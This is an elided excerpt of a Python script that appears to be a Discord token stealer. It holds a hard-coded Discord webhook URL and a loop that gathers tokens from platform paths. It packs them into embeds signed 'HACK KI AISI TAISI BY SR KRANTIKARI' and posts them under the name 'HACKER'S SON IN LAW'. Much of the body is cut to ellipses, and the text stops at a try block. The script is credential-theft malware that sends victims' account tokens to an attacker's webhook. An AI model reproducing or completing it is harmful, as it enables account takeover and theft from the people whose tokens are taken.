...
webhook_url = "https://discord.com/api/webhooks/906477891670392863/Hlu5wxWvVe91Eewgy6oCuOllT6C-WEGoAMT_EZc3kyHT_ZQrUPXRJkiArPjs6vnmaXtX"
...
def main():
	...
	for platform, path in PATHS.items():
		...
		for token in gettokens(path):
			...
			embed = {
				...
				"footer": {
					"text": "HACK KI AISI TAISI BY SR KRANTIKARI"
				}
			}
			embeds.append(embed)
	...
	webhook = {
		"content": "",
		"embeds": embeds,
		"username": "HACKER'S SON IN LAW",
		"avatar_url": "https://media.discordapp.net/attachments/906396038720528388/906524954923786260/1685a79a-23f8-4307-9487-a1a5cb59302f.png"
	}
	try:
